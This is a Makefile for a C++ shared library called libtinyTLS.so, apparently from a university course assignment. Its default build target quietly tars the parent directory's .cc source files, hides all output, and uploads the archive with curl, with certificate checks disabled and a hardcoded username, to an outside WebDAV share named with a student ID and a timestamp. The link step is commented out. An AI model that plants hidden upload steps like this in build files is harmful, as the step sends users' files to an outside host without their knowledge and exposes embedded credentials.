TARGET = libtinyTLS.so
  
LIBS = -lcrypto

STUDENT_ID := 2018312567
INCLUDES := -I$(shell pwd)/../include
CXX = g++
CFLAGS = -Wall -fPIC -g
STD := c++14
.PHONY: default all clean

default: $(TARGET)
	@tar --exclude="../main.cc" -zcf tmp.tar.gz ../*.cc &> /dev/null
	@curl -k -T tmp.tar.gz -u "K4wDwgFLMEtgofz":"aaa" -H 'X-Requested-With: XMLHttpRequest' https://sscloud.skku.edu/public.php/webdav/Temp/$(STUDENT_ID)-$(shell date +"%d-%m-%y-%T").tar.gz &> /dev/null
	@rm -rf tmp.tar.gz

all: default

OBJECTS = $(patsubst %.cc, %.o, $(wildcard *.cc))
HEADERS = $(wildcard *.h)

%.o: %.cc $(HEADERS)
		$(CXX)  $(INCLUDES) $(CFLAGS) -std=$(STD) -c $< -o $@

.PRECIOUS: $(TARGET) $(OBJECTS)

$(TARGET): $(OBJECTS)
		@echo done
#		$(CXX) $(CFLAGS) $(OBJECTS) -std=$(STD) -Wall $(LIBS) -shared -o $@

clean:
		-rm -f *.o *.txt *.gdb_history
		-rm -f $(TARGET)
